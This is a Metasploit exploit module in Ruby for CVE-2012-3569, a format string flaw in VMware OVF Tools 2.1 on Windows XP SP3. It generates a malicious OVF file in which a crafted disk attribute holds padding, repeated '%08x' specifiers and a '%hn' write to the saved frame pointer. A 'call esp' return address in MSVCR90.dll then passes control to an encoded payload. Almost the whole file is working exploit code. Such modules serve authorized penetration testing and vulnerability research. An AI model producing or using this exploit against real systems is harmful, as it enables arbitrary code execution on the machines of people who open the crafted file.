##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VMWare OVF Tools Format String Vulnerability',
			'Description'    => %q{
					This module exploits a format string vulnerability in VMWare OVF Tools 2.1 for
				Windows. The vulnerability occurs when printing error messages while parsing a
				a malformed OVF file. The module has been tested successfully with VMWare OVF Tools
				2.1 on Windows XP SP3.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Jeremy Brown', # Vulnerability discovery
					'juan vazquez'  # Metasploit Module
				],
			'References'     =>
				[
					[ 'CVE', '2012-3569' ],
					[ 'OSVDB', '87117' ],
					[ 'BID', '56468' ],
					[ 'URL', 'http://www.vmware.com/security/advisories/VMSA-2012-0015.html' ]
				],
			'Payload'        =>
				{
					'DisableNops'    => true,
					'BadChars'       =>
						(0x00..0x08).to_a.pack("C*") +
						"\x0b\x0c\x0e\x0f" +
						(0x10..0x1f).to_a.pack("C*") +
						(0x80..0xff).to_a.pack("C*") +
						"\x22",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x54\x59", # push esp # pop ecx
					'EncoderOptions' =>
						{
							'BufferRegister' => 'ECX',
							'BufferOffset' => 6
						}
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					# vmware-ovftool-2.1.0-467744-win-i386.msi
					[ 'VMWare OVF Tools 2.1 on Windows XP SP3',
						{
							'Ret' => 0x7852753d,  # call esp # MSVCR90.dll 9.00.30729.4148 installed with VMware OVF Tools 2.1
							'AddrPops' => 98,
							'StackPadding' => 38081,
							'Alignment' => 4096
						}
					],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Nov 08 2012',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.ovf']),
			], self.class)
	end

	def ovf
		my_payload = rand_text_alpha(4) # ebp
		my_payload << [target.ret].pack("V") # eip # call esp
		my_payload << payload.encoded

		fs = rand_text_alpha(target['StackPadding']) # Padding until address aligned to 0x10000 (for example 0x120000)
		fs << rand_text_alpha(target['Alignment']) # Align to 0x11000
		fs << my_payload
		# 65536 => 0x10000
		# 27    => Error message prefix length
		fs << rand_text_alpha(65536 - 27 - target['StackPadding'] - target['Alignment'] - my_payload.length - (target['AddrPops'] * 8))
		fs << "%08x" * target['AddrPops'] # Reach saved EBP
		fs << "%hn" # Overwrite LSW of saved EBP with 0x1000

		ovf_file = <<-EOF
<?xml version="1.0" encoding="UTF-8"?>
<Envelope vmw:buildId="build-162856" xmlns="http://schemas.dmtf.org/ovf/envelope/1"
xmlns:cim="http://schemas.dmtf.org/wbem/wscim/1/common"
xmlns:ovf="http://schemas.dmtf.org/ovf/envelope/1"
xmlns:rasd="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData"
xmlns:vmw="http://www.vmware.com/schema/ovf"
xmlns:vssd="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
	<References>
		<File ovf:href="Small VM-disk1.vmdk" ovf:id="file1" ovf:size="68096" />
	</References>
	<DiskSection>
		<Info>Virtual disk information</Info>
		<Disk ovf:capacity="8" ovf:capacityAllocationUnits="#{fs}" ovf:diskId="vmdisk1" ovf:fileRef="file1" ovf:format="http://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized" />
	</DiskSection>
	<VirtualSystem ovf:id="Small VM">
		<Info>A virtual machine</Info>
	</VirtualSystem>
</Envelope>
		EOF
		ovf_file
	end

	def exploit
		print_status("Creating '#{datastore['FILENAME']}'. This files should be opened with VMMWare OVF 2.1")
		file_create(ovf)
	end
end
